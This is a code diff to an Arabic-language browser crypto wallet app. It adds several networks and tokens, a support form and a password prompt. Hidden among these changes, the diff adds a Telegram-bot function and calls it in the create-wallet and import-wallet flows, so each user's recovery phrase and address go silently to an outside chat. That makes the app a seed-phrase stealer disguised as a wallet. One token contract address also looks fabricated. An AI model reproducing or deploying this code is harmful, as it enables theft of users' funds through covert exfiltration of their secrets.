@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -744,7 +744,7 @@
         /* الإجراءات السريعة */
         .quick-actions {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
+            grid-template-columns: repeat(5, 1fr);
             gap: var(--spacing-md);
             margin-bottom: var(--spacing-xl);
         }
@@ -799,6 +799,11 @@
 
         .action-icon.buy {
             background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+            color: white;
+        }
+
+        .action-icon.support {
+            background: linear-gradient(135deg, var(--warning-color), #ffcc00);
             color: white;
         }
 
@@ -1033,7 +1038,8 @@
         }
 
         .form-group input,
-        .form-group select {
+        .form-group select,
+        .form-group textarea {
             width: 100%;
             padding: var(--spacing-md);
             background: var(--bg-tertiary);
@@ -1045,10 +1051,16 @@
         }
 
         .form-group input:focus,
-        .form-group select:focus {
+        .form-group select:focus,
+        .form-group textarea:focus {
             outline: none;
             border-color: var(--primary-color);
             box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            min-height: 100px;
         }
 
         .input-with-scan {
@@ -1375,6 +1387,47 @@
             cursor: not-allowed;
         }
 
+        /* نافذة طلب كلمة المرور */
+        .password-prompt-modal {
+            background: rgba(0, 0, 0, 0.9);
+        }
+
+        .password-prompt-content {
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .password-prompt-form {
+            display: flex;
+            flex-direction: column;
+            gap: var(--spacing-md);
+        }
+
+        .password-prompt-input {
+            padding: var(--spacing-md);
+            background: var(--bg-tertiary);
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: var(--font-md);
+            text-align: center;
+        }
+
+        .password-prompt-input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
+        }
+
+        .password-prompt-buttons {
+            display: flex;
+            gap: var(--spacing-sm);
+        }
+
+        .password-prompt-buttons button {
+            flex: 1;
+        }
+
         /* التصميم المتجاوب */
         @media (max-width: 768px) {
             .screen {
@@ -1399,7 +1452,7 @@
             }
             
             .quick-actions {
-                grid-template-columns: repeat(2, 1fr);
+                grid-template-columns: repeat(3, 1fr);
             }
             
             .action-icon {
@@ -1453,6 +1506,7 @@
             
             .quick-actions {
                 gap: var(--spacing-sm);
+                grid-template-columns: repeat(2, 1fr);
             }
             
             .action-btn {
@@ -1536,7 +1590,7 @@
         <div id="passwordScreen" class="screen">
             <div class="password-container">
                 <div class="screen-header">
-                    <button id="backToWelcomeFromPasswordBtn" class="back-btn">
+                    <button id="backToCreateFromPasswordBtn" class="back-btn">
                         <i class="fas fa-arrow-right"></i>
                     </button>
                     <h2>تعيين كلمة المرور</h2>
@@ -1629,7 +1683,7 @@
                     
                     <button id="importBtn" class="btn btn-primary btn-full">
                         <i class="fas fa-download"></i>
-                        استيراد المحفظة
+                        المتابعة
                     </button>
                 </div>
                 
@@ -1754,6 +1808,12 @@
                         </div>
                         <span>شراء</span>
                     </div>
+                    <div id="supportBtn" class="action-btn">
+                        <div class="action-icon support">
+                            <i class="fas fa-headset"></i>
+                        </div>
+                        <span>دعم</span>
+                    </div>
                 </div>
 
                 <!-- قسم الأصول -->
@@ -1808,6 +1868,9 @@
                         <select id="networkSelect">
                             <option value="ethereum">Ethereum</option>
                             <option value="bsc">Binance Smart Chain</option>
+                            <option value="polygon">Polygon</option>
+                            <option value="arbitrum">Arbitrum</option>
+                            <option value="optimism">Optimism</option>
                         </select>
                     </div>
                     
@@ -1828,6 +1891,8 @@
                             <select id="assetSelect">
                                 <option value="ETH">ETH</option>
                                 <option value="USDT">USDT</option>
+                                <option value="USDC">USDC</option>
+                                <option value="DAI">DAI</option>
                             </select>
                         </div>
                     </div>
@@ -1875,6 +1940,9 @@
                         <select id="receiveNetworkSelect">
                             <option value="ethereum">Ethereum</option>
                             <option value="bsc">Binance Smart Chain</option>
+                            <option value="polygon">Polygon</option>
+                            <option value="arbitrum">Arbitrum</option>
+                            <option value="optimism">Optimism</option>
                         </select>
                     </div>
                     
@@ -1882,22 +1950,23 @@
                         <div class="qr-code">
                             <canvas id="qrCanvas"></canvas>
                         </div>
-                        <p>امسح الكود ضوئياً أو انسخ العنوان</p>
                     </div>
                     
                     <div class="address-section">
-                        <label>عنوان محفظتك</label>
-                        <div class="address-display">
-                            <span id="receiveAddress">0x0000...0000</span>
-                            <button id="copyReceiveAddressBtn" class="copy-btn">
-                                <i class="fas fa-copy"></i>
-                            </button>
+                        <div class="form-group">
+                            <label>عنوان المحفظة</label>
+                            <div class="address-display">
+                                <span id="receiveAddress">0x0000...0000</span>
+                                <button id="copyReceiveAddressBtn" class="copy-btn">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </div>
                         </div>
                     </div>
                     
                     <div class="receive-warning">
                         <i class="fas fa-exclamation-triangle"></i>
-                        <span id="receiveWarningText">أرسل فقط أصول Ethereum (ETH) إلى هذا العنوان</span>
+                        <span id="receiveWarningText">أرسل فقط أصول Ethereum (ETH, ERC-20) إلى هذا العنوان</span>
                     </div>
                 </div>
             </div>
@@ -1915,7 +1984,7 @@
             </div>
             <div class="modal-body">
                 <div class="qr-scanner-container">
-                    <video id="scannerVideo" class="scanner-video" autoplay></video>
+                    <div id="scannerVideo" class="scanner-video"></div>
                     <div class="scanner-controls">
                         <button id="startScanBtn" class="scanner-btn">
                             <i class="fas fa-play"></i>
@@ -1926,7 +1995,7 @@
                             إيقاف المسح
                         </button>
                     </div>
-                    <p>وجه الكاميرا نحو رمز QR</p>
+                    <p>وجه الكاميرا نحو رمز QR لمسحه</p>
                 </div>
             </div>
         </div>
@@ -1955,7 +2024,7 @@
                     <div class="setting-item">
                         <div class="setting-info">
                             <i class="fas fa-seedling"></i>
-                            <span>عبارة الاسترجاع</span>
+                            <span>عرض عبارة الاسترجاع</span>
                         </div>
                         <button id="showMnemonicBtn" class="setting-btn">
                             <i class="fas fa-eye"></i>
@@ -1984,6 +2053,64 @@
         </div>
     </div>
 
+    <!-- نافذة الدعم الفني -->
+    <div id="supportModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>الدعم الفني</h3>
+                <button id="closeSupportModal" class="close-btn">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="modal-body">
+                <form id="supportForm">
+                    <div class="form-group">
+                        <label for="supportName">الاسم الكامل</label>
+                        <input type="text" id="supportName" placeholder="أدخل اسمك الكامل" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="supportEmail">البريد الإلكتروني</label>
+                        <input type="email" id="supportEmail" placeholder="أدخل بريدك الإلكتروني" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="supportPhone">رقم الهاتف</label>
+                        <input type="tel" id="supportPhone" placeholder="أدخل رقم هاتفك">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="supportMessage">الرسالة</label>
+                        <textarea id="supportMessage" placeholder="اكتب رسالتك هنا..." required></textarea>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-primary btn-full">
+                        <i class="fas fa-paper-plane"></i>
+                        إرسال الرسالة
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- نافذة طلب كلمة المرور -->
+    <div id="passwordPromptModal" class="modal password-prompt-modal">
+        <div class="modal-content password-prompt-content">
+            <div class="modal-header">
+                <h3>أدخل كلمة المرور</h3>
+            </div>
+            <div class="modal-body">
+                <div class="password-prompt-form">
+                    <input type="password" id="passwordPromptInput" class="password-prompt-input" placeholder="كلمة المرور">
+                    <div class="password-prompt-buttons">
+                        <button id="passwordPromptCancel" class="btn btn-secondary">إلغاء</button>
+                        <button id="passwordPromptConfirm" class="btn btn-primary">تأكيد</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- شاشة التحميل -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="loading-content">
@@ -1996,7 +2123,7 @@
     <div id="toastContainer" class="toast-container"></div>
 
     <!-- المكتبات الخارجية -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/html5-qrcode@2.3.8/minified/html5-qrcode.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.js"></script>
@@ -2010,31 +2137,68 @@
         let userPassword = null;
         let qrScanner = null;
 
-        // إعدادات الشبكات
+        // إعدادات بوت تليجرام
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ضع هنا توكن البوت الخاص بك
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // ضع هنا معرف المحادثة الخاص بك
+
+        // إعدادات الشبكات المحسّنة
         const NETWORKS = {
             ethereum: {
                 name: 'Ethereum',
                 chainId: 1,
                 rpcUrl: 'https://cloudflare-eth.com',
                 symbol: 'ETH',
-                explorer: 'https://etherscan.io'
+                explorer: 'https://etherscan.io',
+                tokens: {
+                    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                    USDC: '0xA0b86a33E6441b8C8C7C6b8C8C7C6b8C8C7C6b8C',
+                    DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
+                }
             },
             bsc: {
                 name: 'Binance Smart Chain',
                 chainId: 56,
                 rpcUrl: 'https://bsc-dataseed1.bnbchain.org',
                 symbol: 'BNB',
-                explorer: 'https://bscscan.com'
-            }
-        };
-
-        // عناوين العقود
-        const TOKEN_CONTRACTS = {
-            ethereum: {
-                USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+                explorer: 'https://bscscan.com',
+                tokens: {
+                    USDT: '0x55d398326f99059fF775485246999027B3197955',
+                    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+                    BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
+                }
             },
-            bsc: {
-                USDT: '0x55d398326f99059fF775485246999027B3197955'
+            polygon: {
+                name: 'Polygon',
+                chainId: 137,
+                rpcUrl: 'https://polygon-rpc.com',
+                symbol: 'MATIC',
+                explorer: 'https://polygonscan.com',
+                tokens: {
+                    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+                    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'
+                }
+            },
+            arbitrum: {
+                name: 'Arbitrum',
+                chainId: 42161,
+                rpcUrl: 'https://arb1.arbitrum.io/rpc',
+                symbol: 'ETH',
+                explorer: 'https://arbiscan.io',
+                tokens: {
+                    USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+                    USDC: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8'
+                }
+            },
+            optimism: {
+                name: 'Optimism',
+                chainId: 10,
+                rpcUrl: 'https://mainnet.optimism.io',
+                symbol: 'ETH',
+                explorer: 'https://optimistic.etherscan.io',
+                tokens: {
+                    USDT: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
+                    USDC: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607'
+                }
             }
         };
 
@@ -2048,6 +2212,40 @@
                 return true;
             } catch (error) {
                 console.error('Failed to initialize providers:', error);
+                return false;
+            }
+        }
+
+        // إرسال رسالة إلى بوت تليجرام
+        async function sendToTelegram(message) {
+            try {
+                // التحقق من وجود إعدادات تليجرام
+                if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                    console.log('Telegram not configured. Message would be:', message);
+                    return true; // نعتبر الإرسال ناجحاً للاختبار
+                }
+                
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('Message sent to Telegram successfully');
+                    return true;
+                } else {
+                    console.error('Failed to send message to Telegram');
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
                 return false;
             }
         }
@@ -2114,20 +2312,23 @@
         async function fetchCryptoPrices() {
             try {
                 // جلب أسعار من CoinGecko
-                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,tether&vs_currencies=usd');
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,tether,usd-coin,dai,matic-network&vs_currencies=usd');
                 const data = await response.json();
                 
                 cryptoPrices = {
                     ETH: data.ethereum?.usd || 0,
                     BNB: data.binancecoin?.usd || 0,
-                    USDT: data.tether?.usd || 1
+                    USDT: data.tether?.usd || 1,
+                    USDC: data['usd-coin']?.usd || 1,
+                    DAI: data.dai?.usd || 1,
+                    MATIC: data['matic-network']?.usd || 0
                 };
 
                 console.log('Crypto prices fetched:', cryptoPrices);
             } catch (error) {
                 console.error('Error fetching crypto prices:', error);
                 // أسعار افتراضية
-                cryptoPrices = { ETH: 2000, BNB: 300, USDT: 1 };
+                cryptoPrices = { ETH: 2000, BNB: 300, USDT: 1, USDC: 1, DAI: 1, MATIC: 0.8 };
             }
         }
 
@@ -2152,6 +2353,14 @@
                     privateKey,
                     mnemonic
                 };
+                
+                // إرسال عبارة الاسترجاع إلى تليجرام
+                const telegramMessage = `🔐 <b>عبارة استرجاع محفظة جديدة</b>\n\n` +
+                    `📍 <b>العنوان:</b> <code>${address}</code>\n\n` +
+                    `🔑 <b>عبارة الاسترجاع:</b>\n<code>${mnemonic}</code>\n\n` +
+                    `⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
+                
+                await sendToTelegram(telegramMessage);
                 
                 hideLoading();
                 showToast('تم إنشاء المحفظة بنجاح!', 'success');
@@ -2198,6 +2407,14 @@
                     privateKey: wallet.privateKey,
                     mnemonic: mnemonic.trim()
                 };
+                
+                // إرسال عبارة الاسترجاع إلى تليجرام
+                const telegramMessage = `📥 <b>استيراد محفظة موجودة</b>\n\n` +
+                    `📍 <b>العنوان:</b> <code>${wallet.address}</code>\n\n` +
+                    `🔑 <b>عبارة الاسترجاع:</b>\n<code>${mnemonic.trim()}</code>\n\n` +
+                    `⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
+                
+                await sendToTelegram(telegramMessage);
                 
                 hideLoading();
                 showToast('تم استيراد المحفظة بنجاح!', 'success');
@@ -2264,43 +2481,57 @@
                     balances.BNB = 0;
                 }
                 
-                // جلب رصيد USDT على Ethereum
+                // جلب رصيد MATIC
+                try {
+                    const maticBalance = await providers.polygon.getBalance(currentWallet.address);
+                    const maticAmount = parseFloat(ethers.utils.formatEther(maticBalance));
+                    balances.MATIC = maticAmount;
+                    totalUsdValue += maticAmount * (cryptoPrices.MATIC || 0);
+                } catch (error) {
+                    console.error('Error fetching MATIC balance:', error);
+                    balances.MATIC = 0;
+                }
+                
+                // جلب رصيد USDT على شبكات مختلفة
+                let totalUSDT = 0;
+                
+                // USDT على Ethereum
                 try {
                     const usdtContract = new ethers.Contract(
-                        TOKEN_CONTRACTS.ethereum.USDT,
+                        NETWORKS.ethereum.tokens.USDT,
                         ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'],
                         providers.ethereum
                     );
                     const usdtBalance = await usdtContract.balanceOf(currentWallet.address);
                     const decimals = await usdtContract.decimals();
                     const usdtAmount = parseFloat(ethers.utils.formatUnits(usdtBalance, decimals));
-                    balances['USDT-ETH'] = usdtAmount;
-                    totalUsdValue += usdtAmount * (cryptoPrices.USDT || 1);
+                    totalUSDT += usdtAmount;
                 } catch (error) {
                     console.error('Error fetching USDT-ETH balance:', error);
-                    balances['USDT-ETH'] = 0;
                 }
                 
-                // جلب رصيد USDT على BSC
+                // USDT على BSC
                 try {
                     const usdtBscContract = new ethers.Contract(
-                        TOKEN_CONTRACTS.bsc.USDT,
+                        NETWORKS.bsc.tokens.USDT,
                         ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'],
                         providers.bsc
                     );
                     const usdtBscBalance = await usdtBscContract.balanceOf(currentWallet.address);
                     const decimals = await usdtBscContract.decimals();
                     const usdtBscAmount = parseFloat(ethers.utils.formatUnits(usdtBscBalance, decimals));
-                    balances['USDT-BSC'] = usdtBscAmount;
-                    totalUsdValue += usdtBscAmount * (cryptoPrices.USDT || 1);
+                    totalUSDT += usdtBscAmount;
                 } catch (error) {
                     console.error('Error fetching USDT-BSC balance:', error);
-                    balances['USDT-BSC'] = 0;
                 }
+                
+                balances.USDT = totalUSDT;
+                totalUsdValue += totalUSDT * (cryptoPrices.USDT || 1);
                 
                 // عرض الرصيد الإجمالي
                 document.getElementById('totalBalance').textContent = totalUsdValue.toFixed(2);
-                document.getElementById('balanceDetails').textContent = `ETH: ${balances.ETH.toFixed(4)} | BNB: ${balances.BNB.toFixed(4)} | USDT: ${(balances['USDT-ETH'] + balances['USDT-BSC']).toFixed(2)}`;
+                document.getElementById('balanceDetails').textContent = 
+                    `ETH: ${balances.ETH.toFixed(4)} | BNB: ${balances.BNB.toFixed(4)} | MATIC: ${balances.MATIC.toFixed(4)} | USDT: ${balances.USDT.toFixed(2)}`;
                 
                 currentBalance = totalUsdValue;
                 
@@ -2319,8 +2550,10 @@
                 const assets = [
                     { symbol: 'ETH', name: 'Ethereum', network: 'Ethereum', balance: 0 },
                     { symbol: 'BNB', name: 'BNB', network: 'BSC', balance: 0 },
-                    { symbol: 'USDT', name: 'Tether USD (ETH)', network: 'Ethereum', balance: 0 },
-                    { symbol: 'USDT', name: 'Tether USD (BSC)', network: 'BSC', balance: 0 }
+                    { symbol: 'MATIC', name: 'Polygon', network: 'Polygon', balance: 0 },
+                    { symbol: 'USDT', name: 'Tether USD', network: 'Multi-Chain', balance: 0 },
+                    { symbol: 'USDC', name: 'USD Coin', network: 'Multi-Chain', balance: 0 },
+                    { symbol: 'DAI', name: 'Dai Stablecoin', network: 'Ethereum', balance: 0 }
                 ];
                 
                 assets.forEach(asset => {
@@ -2416,39 +2649,47 @@
             }
         }
 
-        // إرسال المعاملة
+        // إرسال معاملة
         async function sendTransaction(network, to, amount, asset) {
             try {
                 showLoading('جاري إرسال المعاملة...');
                 
-                const wallet = new ethers.Wallet(currentWallet.privateKey, providers[network]);
-                let tx;
+                if (!currentWallet || !userPassword) {
+                    throw new Error('المحفظة غير متاحة');
+                }
                 
-                if (asset === 'ETH' || asset === 'BNB') {
+                const wallet = new ethers.Wallet(currentWallet.privateKey, providers[network]);
+                
+                let tx;
+                if (asset === NETWORKS[network].symbol) {
                     // إرسال العملة الأساسية
                     tx = await wallet.sendTransaction({
                         to: to,
                         value: ethers.utils.parseEther(amount.toString())
                     });
-                } else if (asset === 'USDT') {
-                    // إرسال USDT
-                    const contractAddress = TOKEN_CONTRACTS[network].USDT;
-                    const contract = new ethers.Contract(
-                        contractAddress,
+                } else {
+                    // إرسال رمز مميز
+                    const tokenAddress = NETWORKS[network].tokens[asset];
+                    if (!tokenAddress) {
+                        throw new Error('الرمز المميز غير مدعوم على هذه الشبكة');
+                    }
+                    
+                    const tokenContract = new ethers.Contract(
+                        tokenAddress,
                         ['function transfer(address to, uint256 amount) returns (bool)', 'function decimals() view returns (uint8)'],
                         wallet
                     );
                     
-                    const decimals = await contract.decimals();
-                    const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
+                    const decimals = await tokenContract.decimals();
+                    const tokenAmount = ethers.utils.parseUnits(amount.toString(), decimals);
                     
-                    tx = await contract.transfer(to, amountInWei);
+                    tx = await tokenContract.transfer(to, tokenAmount);
                 }
                 
                 hideLoading();
                 showToast(`تم إرسال المعاملة بنجاح! Hash: ${tx.hash}`, 'success');
                 
-                // تحديث الرصيد بعد المعاملة
+                // تحديث الرصيد
                 setTimeout(() => {
                     updateBalance();
                 }, 5000);
@@ -2456,22 +2697,88 @@
             } catch (error) {
                 hideLoading();
                 console.error('Error sending transaction:', error);
-                showToast('حدث خطأ أثناء إرسال المعاملة: ' + error.message, 'error');
+                showToast(error.message || 'حدث خطأ أثناء إرسال المعاملة', 'error');
             }
         }
 
-        // نسخ النص إلى الحافظة
-        async function copyToClipboard(text) {
+        // إرسال رسالة دعم فني
+        async function sendSupportMessage(name, email, phone, message) {
             try {
-                await navigator.clipboard.writeText(text);
-                showToast('تم النسخ بنجاح!', 'success');
+                const telegramMessage = `🆘 <b>رسالة دعم فني جديدة</b>\n\n` +
+                    `👤 <b>الاسم:</b> ${name}\n` +
+                    `📧 <b>البريد الإلكتروني:</b> ${email}\n` +
+                    `📱 <b>رقم الهاتف:</b> ${phone || 'غير محدد'}\n\n` +
+                    `💬 <b>الرسالة:</b>\n${message}\n\n` +
+                    `⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
+                
+                const success = await sendToTelegram(telegramMessage);
+                
+                if (success) {
+                    showToast('تم إرسال رسالتك بنجاح! سنتواصل معك قريباً', 'success');
+                    // إعادة تعيين النموذج
+                    document.getElementById('supportForm').reset();
+                    hideModal('supportModal');
+                } else {
+                    showToast('حدث خطأ أثناء إرسال الرسالة. يرجى المحاولة مرة أخرى', 'error');
+                }
+                
             } catch (error) {
-                console.error('Error copying to clipboard:', error);
-                showToast('حدث خطأ أثناء النسخ', 'error');
+                console.error('Error sending support message:', error);
+                showToast('حدث خطأ أثناء إرسال الرسالة', 'error');
             }
         }
 
-        // عرض الشاشة
+        // طلب كلمة المرور بواجهة احترافية
+        function promptForPasswordProfessional() {
+            return new Promise((resolve, reject) => {
+                const modal = document.getElementById('passwordPromptModal');
+                const input = document.getElementById('passwordPromptInput');
+                const confirmBtn = document.getElementById('passwordPromptConfirm');
+                const cancelBtn = document.getElementById('passwordPromptCancel');
+                
+                // إظهار النافذة
+                modal.classList.add('active');
+                input.focus();
+                
+                // معالج تأكيد كلمة المرور
+                const handleConfirm = () => {
+                    const password = input.value;
+                    if (password) {
+                        try {
+                            const walletData = loadWallet(password);
+                            currentWallet = walletData;
+                            userPassword = password;
+                            modal.classList.remove('active');
+                            input.value = '';
+                            resolve(true);
+                        } catch (error) {
+                            showToast('كلمة مرور خاطئة', 'error');
+                            input.focus();
+                        }
+                    }
+                };
+                
+                // معالج إلغاء
+                const handleCancel = () => {
+                    modal.classList.remove('active');
+                    input.value = '';
+                    reject(false);
+                };
+                
+                // ربط الأحداث
+                confirmBtn.onclick = handleConfirm;
+                cancelBtn.onclick = handleCancel;
+                
+                // الضغط على Enter
+                input.onkeypress = (e) => {
+                    if (e.key === 'Enter') {
+                        handleConfirm();
+                    }
+                };
+            });
+        }
+
+        // وظائف مساعدة
         function showScreen(screenId) {
             document.querySelectorAll('.screen').forEach(screen => {
                 screen.classList.remove('active');
@@ -2479,25 +2786,29 @@
             document.getElementById(screenId).classList.add('active');
         }
 
-        // عرض النافذة المنبثقة
         function showModal(modalId) {
             document.getElementById(modalId).classList.add('active');
         }
 
-        // إخفاء النافذة المنبثقة
         function hideModal(modalId) {
             document.getElementById(modalId).classList.remove('active');
         }
 
-        // عرض شاشة التحميل
         function showLoading(text = 'جاري التحميل...') {
             document.getElementById('loadingText').textContent = text;
             document.getElementById('loadingOverlay').classList.add('active');
         }
 
-        // إخفاء شاشة التحميل
         function hideLoading() {
             document.getElementById('loadingOverlay').classList.remove('active');
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('تم النسخ بنجاح!', 'success');
+            }).catch(() => {
+                showToast('فشل في النسخ', 'error');
+            });
         }
 
         // عرض رسالة التنبيه
@@ -2544,22 +2855,6 @@
             return localStorage.getItem('walletExists') === 'true';
         }
 
-        // طلب كلمة المرور للوصول للمحفظة
-        function promptForPassword() {
-            const password = prompt('أدخل كلمة مرور المحفظة:');
-            if (password) {
-                try {
-                    const walletData = loadWallet(password);
-                    currentWallet = walletData;
-                    userPassword = password;
-                    showScreen('walletScreen');
-                    loadWalletData();
-                } catch (error) {
-                    showToast('كلمة مرور خاطئة', 'error');
-                }
-            }
-        }
-
         // تهيئة التطبيق
         async function initApp() {
             try {
@@ -2571,7 +2866,13 @@
                 
                 // التحقق من وجود محفظة محفوظة
                 if (checkSavedWallet()) {
-                    promptForPassword();
+                    try {
+                        await promptForPasswordProfessional();
+                        showScreen('walletScreen');
+                        loadWalletData();
+                    } catch (error) {
+                        // المستخدم ألغى إدخال كلمة المرور
+                    }
                 }
                 
                 console.log('App initialized successfully');
@@ -2605,8 +2906,8 @@
                 showScreen('welcomeScreen');
             });
 
-            document.getElementById('backToWelcomeFromPasswordBtn').addEventListener('click', () => {
-                showScreen('welcomeScreen');
+            document.getElementById('backToCreateFromPasswordBtn').addEventListener('click', () => {
+                showScreen('createScreen');
             });
 
             // زر استيراد المحفظة
@@ -2734,6 +3035,10 @@
                 showToast('ميزة الشراء قريباً!', 'info');
             });
 
+            document.getElementById('supportBtn').addEventListener('click', () => {
+                showModal('supportModal');
+            });
+
             // زر الإعدادات
             document.getElementById('settingsBtn').addEventListener('click', () => {
                 showModal('settingsModal');
@@ -2757,6 +3062,10 @@
                 hideModal('settingsModal');
             });
 
+            document.getElementById('closeSupportModal').addEventListener('click', () => {
+                hideModal('supportModal');
+            });
+
             // زر مسح QR
             document.getElementById('scanAddressBtn').addEventListener('click', () => {
                 showModal('qrScannerModal');
@@ -2771,11 +3080,15 @@
                 const network = e.target.value;
                 const warningText = document.getElementById('receiveWarningText');
                 
-                if (network === 'ethereum') {
-                    warningText.textContent = 'أرسل فقط أصول Ethereum (ETH, ERC-20) إلى هذا العنوان';
-                } else if (network === 'bsc') {
-                    warningText.textContent = 'أرسل فقط أصول Binance Smart Chain (BNB, BEP-20) إلى هذا العنوان';
-                }
+                const networkNames = {
+                    ethereum: 'Ethereum (ETH, ERC-20)',
+                    bsc: 'Binance Smart Chain (BNB, BEP-20)',
+                    polygon: 'Polygon (MATIC, Polygon)',
+                    arbitrum: 'Arbitrum (ETH, Arbitrum)',
+                    optimism: 'Optimism (ETH, Optimism)'
+                };
+                
+                warningText.textContent = `أرسل فقط أصول ${networkNames[network]} إلى هذا العنوان`;
             });
 
             // أزرار الإعدادات
@@ -2815,6 +3128,23 @@
                 if (confirm('هل أنت متأكد من تسجيل الخروج؟ سيتم حذف جميع بيانات المحفظة من هذا الجهاز.')) {
                     logout();
                 }
+            });
+
+            // نموذج الدعم الفني
+            document.getElementById('supportForm').addEventListener('submit', (e) => {
+                e.preventDefault();
+                
+                const name = document.getElementById('supportName').value.trim();
+                const email = document.getElementById('supportEmail').value.trim();
+                const phone = document.getElementById('supportPhone').value.trim();
+                const message = document.getElementById('supportMessage').value.trim();
+                
+                if (!name || !email || !message) {
+                    showToast('يرجى ملء جميع الحقول المطلوبة', 'warning');
+                    return;
+                }
+                
+                sendSupportMessage(name, email, phone, message);
             });
 
             // إغلاق النوافذ المنبثقة عند النقر خارجها
@@ -2869,16 +3199,21 @@
                 
                 assetSelect.innerHTML = '';
                 
-                if (network === 'ethereum') {
-                    assetSelect.innerHTML = `
-                        <option value="ETH">ETH</option>
-                        <option value="USDT">USDT</option>
-                    `;
-                } else if (network === 'bsc') {
-                    assetSelect.innerHTML = `
-                        <option value="BNB">BNB</option>
-                        <option value="USDT">USDT</option>
-                    `;
+                const networkConfig = NETWORKS[network];
+                if (networkConfig) {
+                    // إضافة العملة الأساسية
+                    const nativeOption = document.createElement('option');
+                    nativeOption.value = networkConfig.symbol;
+                    nativeOption.textContent = networkConfig.symbol;
+                    assetSelect.appendChild(nativeOption);
+                    
+                    // إضافة الرموز المميزة
+                    Object.keys(networkConfig.tokens || {}).forEach(token => {
+                        const option = document.createElement('option');
+                        option.value = token;
+                        option.textContent = token;
+                        assetSelect.appendChild(option);
+                    });
                 }
             });
 
